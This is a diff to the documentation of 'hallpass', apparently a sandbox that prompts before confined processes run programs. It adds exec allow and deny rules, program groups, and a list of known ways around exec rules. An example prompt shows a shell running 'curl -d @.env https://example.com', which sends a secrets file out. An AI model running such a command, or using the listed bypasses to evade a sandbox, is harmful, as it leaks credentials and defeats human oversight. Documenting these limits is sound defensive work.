@@ -6,7 +6,7 @@ hallpass [flags] [--] [command [args...]]     # default command: $SHELL
   -C, --workdir DIR        project dir, writable without asking (default: cwd)
       --allow PATH         also writable without asking (repeatable)
       --deny PATH          always denied (repeatable, wins over --allow)
-      --no-implicit        only --allow paths are writable: no project dir, $TMPDIR, devices or terminal
+      --no-implicit        only --allow paths are writable and --allow-exec programs run: no project dir, $TMPDIR, devices or terminal
       --allow-tty          the session's own terminal is writable (default true; off with --no-implicit unless given)
       --ask MODE           auto | term | desktop | answer | deny | allow   (default: auto = term if on a terminal, else desktop, else answer;
                            allow = audit: allow everything, log it with --log)
@@ -19,6 +19,10 @@ hallpass [flags] [--] [command [args...]]     # default command: $SHELL
       --allow-net DEST     network destination allowed without asking (repeatable; needs network in --mediate)
       --deny-net DEST      network destination always denied (repeatable, wins over --allow-net)
       --ask-net DEST       network destination asked about, even inside what --allow-net allows (repeatable)
+      --allow-exec PROG    program run without asking (repeatable, comma-separated): a name looked up in $PATH, a path, DIR/** for every program below DIR,
+                           or a group: @shells, @coreutils, @search, @git, @busybox
+      --deny-exec PROG     program never run (repeatable, comma-separated, no groups, wins over --allow-exec)
+      --group @NAME=PROG,...  a group of programs of your own, or a replacement for the built-in group of that name (repeatable)
       --escalate TOOL      strict mode as a regular user: how to run the loader as root:
                            auto | ask | pkexec | sudo | run0 | doas | su | manual | none
                            (default: saved choice, else ask on a terminal, else auto)
@@ -44,7 +48,51 @@ Press Ctrl-] inside a session to see its current rules, including answers given 
 
 On a terminal, the window title starts with `[hallpass]` until the session ends: every title the program sets gets the prefix, and the command running in the foreground, if it is not a shell, is appended (`[hallpass] ~/src — vim main.go`), since the terminal itself only sees hallpass. At exit, hallpass restores the previous title in terminals that support the title stack (xterm, VTE-based ones such as GNOME Terminal); elsewhere, the title stays until your shell sets a new one.
 
-With `--no-implicit`, nothing is writable unless you `--allow` it: not the project, not a `$TMPDIR`, not even `/dev/null`. The session's own terminal stays off too, unless you also pass `--allow-tty` (its `/dev/pts/N` is only known once hallpass starts). See [use cases](use-cases.md) for examples.
+With `--no-implicit`, nothing is writable unless you `--allow` it: not the project, not a `$TMPDIR`, not even `/dev/null`. The session's own terminal stays off too, unless you also pass `--allow-tty` (its `/dev/pts/N` is only known once hallpass starts). As without it, only the command and the `--allow-exec` programs run without asking. See [use cases](use-cases.md) for examples.
+
+## Programs
+
+With `exec` in `--mediate` (the default), hallpass asks before a sandboxed process runs a program no rule allows, like a write:
+
+```
+ hallpass: sh (pid 4242) wants to exec
+ /usr/bin/curl
+ by: sh -c curl -d @.env https://example.com ← bash
+ [t] and [a] allow: /usr/bin/curl
+```
+
+A program that belongs to a group of programs is offered with its group too:
+
+```
+ [g] allows the group: @git (git, git-daemon, git-difftool--helper, … 24 programs)
+ [o] allow once  [t] for 5m0s  [a] always  [g] group  [d] deny  [n] never  [Esc] dismiss
+```
+
+<video src="../assets/demos/exec.mp4" poster="../assets/demos/exec.png" controls muted playsinline aria-label="a shell under hallpass --allow-exec=@coreutils,@search: ls and grep run without a question, git is asked with its group offered and the group allowed, curl is asked and denied, a program built in the project is asked and allowed always, Ctrl-] shows the groups by name and count under Run"></video>
+
+*`--allow-exec=@coreutils,@search` lets the common tools run without a question. `git` is asked about with its group, `@git`, offered; `curl` and a program built in the project are asked about; "always" allows that program only.*
+
+Allowed without asking: only the command given to hallpass (as found in `$PATH`, symlinks resolved), any number of times, and what `--allow-exec` names. A program is its resolved path: `--allow-exec=make` allows `/usr/bin/make`, not every program named `make`; answers ("once", "this session", "always", "never") cover that program only. `--allow-exec=DIR/**` allows every program below `DIR`. Denied programs fail with `EACCES` ("Permission denied", exit code 126 in a shell). A script runs only if its `#!` interpreter may run too: the kernel runs both.
+
+Groups name common sets of programs, resolved to exact paths when the session starts (the programs found in `$PATH`, symlinks followed): `--allow-exec=@shells,@coreutils` allows them all, and a prompt about a program of a group offers "group", which allows the rest of the group for the session. `hallpass policy` and Ctrl-] list a group by name and count; `hallpass policy --allow-exec=@git` shows what it has here.
+
+| Group | Programs |
+|---|---|
+| `@shells` | `sh`, `bash`, `dash`, `zsh`, `ash`, `env` |
+| `@coreutils` | the GNU coreutils programs (`cat`, `ls`, `cp`, `mv`, `rm`, `mkdir`, `chmod`, `head`, `sort`, ...) |
+| `@search` | `grep`, `rg`, `find`, `xargs`, `sed`, `awk`, `diff`, `file`, `less`, `which`, `jq`, ... |
+| `@git` | `git` and its helpers in `git-core` |
+| `@busybox` | `busybox` and its applets installed as hard links (container images) |
+
+Groups are yours to change: `--group=@tools=make,cc,/opt/tools/**` defines `@tools` (programs as in `--allow-exec`, without groups), and `--group` with the name of a built-in group replaces it (`--group=@search=grep,rg`). The groups you define are offered in prompts and allowed by `--allow-exec=@tools` like the built-in ones. A [HallpassPolicy](../kubernetes/policies.md) does the same with `groups`. Names are `@`, a lowercase letter, then lowercase letters, digits or `-`.
+
+Exec rules decide which programs start, not what they do once running, so they are a speed bump against an agent reaching for an unexpected tool, not a boundary:
+
+- **Interpreters run any code**: an allowed `python3`, `node` or `bash` runs whatever `-c`/`-e` code or script it is given, and `ld.so /path/to/program` runs a program without executing it. Allowing an interpreter or the dynamic loader allows everything it can do. Rules on the arguments are planned.
+- **Copies**: a program copied (or downloaded) to a path an allow covers runs. The project directory is writable, not executable: a program built or copied there is asked about.
+- **Multi-call binaries**: when several commands are one binary (busybox, uutils coreutils), they are told apart by path. Commands installed as hard links or copies have paths of their own; commands installed as symlinks all resolve to the one binary, so allowing one of them, or its group, allows all: `busybox` with symlinked applets runs every applet once any is allowed. Telling them apart needs `argv[0]`, which rules do not look at yet.
+- **File descriptors**: a program run from a file descriptor (`execveat` with `AT_EMPTY_PATH`, for example a `memfd`) is asked about as an unknown path in lite mode ("once" only). Strict mode matches the rules on the file the descriptor is open on, without asking, and always denies a `memfd`, which has no path.
+- **binfmt_misc**: lite mode checks a program and its `#!` interpreters, not the handlers the kernel registers for other formats (qemu, Wine): they run. Strict mode checks them in the kernel, but they are never asked about: a handler runs only if a rule allows it (`--allow-exec=/usr/bin/qemu-aarch64-static`), and the program is denied otherwise.
 
 ## Network (experimental)
 
